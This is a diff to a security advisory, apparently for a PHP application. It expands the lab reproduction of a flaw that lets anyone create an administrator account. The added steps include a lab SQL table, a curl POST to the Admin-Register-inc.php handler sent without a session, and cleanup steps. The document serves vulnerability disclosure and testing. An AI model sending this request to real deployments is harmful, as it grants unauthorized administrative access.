@@ -47,13 +47,44 @@ The use of a prepared statement and password hashing protects against separate c
 
 The following validation uses only synthetic data in an isolated laboratory deployment of commit `125362cc21dca20d74091a4913a5096bb58dd837`.
 
-1. Choose an unused synthetic `Admin_id` and canary values for the remaining administrator fields.
-2. Without any session cookie, submit a POST request directly to `/Admin/includes/Admin-Register-inc.php` with `submit=1`, matching `password` and `confirmPassword` values, and the required registration fields.
-3. Observe a redirect containing `success=registered`.
-4. Verify that the canary administrator row was created.
-5. Remove the canary account after the test.
+1. Deploy the repository on PHP 7.x with MySQL or MariaDB and create the application's local database from its `database.php` configuration.
+2. Create a minimum lab table matching the fields used by the handler. Adjust lengths to the repository's schema if one is available:
 
-The original public report records the successful redirect and database row creation. It also supplies a follow-up login request, but does not preserve the login response; this advisory therefore treats unauthorized account creation as the directly reproduced effect and the subsequent administrator login as a code-path-supported impact. No production host, account, or data is required to reproduce the issue.
+   ```sql
+   CREATE TABLE admin (
+     Admin_id INT PRIMARY KEY,
+     Branch_id INT NOT NULL,
+     Name VARCHAR(255) NOT NULL,
+     Mobile_no VARCHAR(32),
+     Email_id VARCHAR(255),
+     DOB DATE,
+     Designation VARCHAR(255),
+     City VARCHAR(255),
+     Password VARCHAR(255) NOT NULL
+   );
+   ```
+
+3. Choose an unused synthetic numeric ID such as `900000001` and a test-only passphrase of at least the application's required length.
+4. Start a clean browser or curl session with no administrator cookie.
+5. Submit directly to the backend handler. The payload below contains only synthetic data:
+
+   ```bash
+   curl -sS -i \
+     -d 'submit=1&Admin_id=900000001&password=<SYNTHETIC_PASSWORD>&confirmPassword=<SYNTHETIC_PASSWORD>&Branch_id=9001&Name=Lab%20Administrator&Mobile_no=9000000000&Email_id=lab-admin-900000001%40example.test&DOB=1990-01-01&Designation=Lab%20Admin&City=TestCity' \
+     "$BASE_URL/Admin/includes/Admin-Register-inc.php" \
+     | sed -n '1,25p'
+   ```
+
+6. Vulnerable result: the handler returns its success redirect, typically containing `success=registered`, even though the request has no administrator session.
+7. Verify only the synthetic row:
+
+   ```sql
+   SELECT Admin_id, Email_id FROM admin
+   WHERE Admin_id = 900000001;
+   ```
+
+8. If the local application login is part of the test plan, authenticate only with the synthetic account and record whether the normal admin login accepts it. This is a local validation of the privilege boundary, not a requirement to test a production administrator account.
+9. Delete the synthetic row or restore the lab database snapshot.
 
 
 ### Impact
